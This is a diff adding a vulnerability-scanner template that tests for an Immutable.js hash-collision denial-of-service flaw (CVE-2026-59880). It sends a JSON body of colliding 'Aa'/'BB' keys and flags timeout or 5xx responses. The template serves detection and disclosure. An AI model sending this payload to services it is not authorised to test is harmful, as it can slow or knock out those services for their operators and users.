@@ -1,0 +1,39 @@
+[info]
+author = "AVE"
+description = "检测 Immutable.js Map/Set 哈希碰撞拒绝服务漏洞，通过发送包含大量哈希碰撞键的 JSON 请求，验证目标是否使用易受攻击的 Immutable.js 版本处理用户可控的键"
+id = "POC-AVE-2026-0848"
+name = "CVE-2026-59880 PoC"
+severity = "high"
+tags = ["cve-2026-59880"]
+vuln_id = [
+    "CVE-2026-59880",
+    "AVE-2026-0848",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"Aa":"1","BB":"2","AaAa":"3","AaBB":"4","BBAa":"5","BBBB":"6","AaAaAa":"7","AaAaBB":"8","AaBBAa":"9","AaBBBB":"10","BBAaAa":"11","BBAaBB":"12","BBBBAa":"13","BBBBBB":"14","AaAaAaAa":"15","AaAaAaBB":"16","AaAaBBAa":"17","AaAaBBBB":"18","AaBBAaAa":"19","AaBBAaBB":"20","AaBBBBAa":"21","AaBBBBBB":"22","BBAaAaAa":"23","BBAaAaBB":"24","BBAaBBAa":"25","BBAaBBBB":"26","BBBBAaAa":"27","BBBBAaBB":"28","BBBBBBAa":"29","BBBBBBBB":"30","AaAaAaAaAa":"31","AaAaAaAaBB":"32","AaAaAaBBAa":"33","AaAaAaBBBB":"34","AaAaBBAaAa":"35","AaAaBBAaBB":"36","AaAaBBBBAa":"37","AaAaBBBBBB":"38","AaBBAaAaAa":"39","AaBBAaAaBB":"40","AaBBAaBBAa":"41","AaBBAaBBBB":"42","AaBBBBAaAa":"43","AaBBBBAaBB":"44","AaBBBBBBAa":"45","AaBBBBBBBB":"46","BBAaAaAaAa":"47","BBAaAaAaBB":"48","BBAaAaBBAa":"49","BBAaAaBBBB":"50","BBAaBBAaAa":"51","BBAaBBAaBB":"52","BBAaBBBBAa":"53","BBAaBBBBBB":"54","BBBBAaAaAa":"55","BBBBAaAaBB":"56","BBBBAaBBAa":"57","BBBBAaBBBB":"58","BBBBBBAaAa":"59","BBBBBBAaBB":"60","BBBBBBBBAa":"61","BBBBBBBBBB":"62"}'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "timeout",
+    "Error",
+    "Internal Server Error",
+    "504",
+    "503",
+    "502",
+]
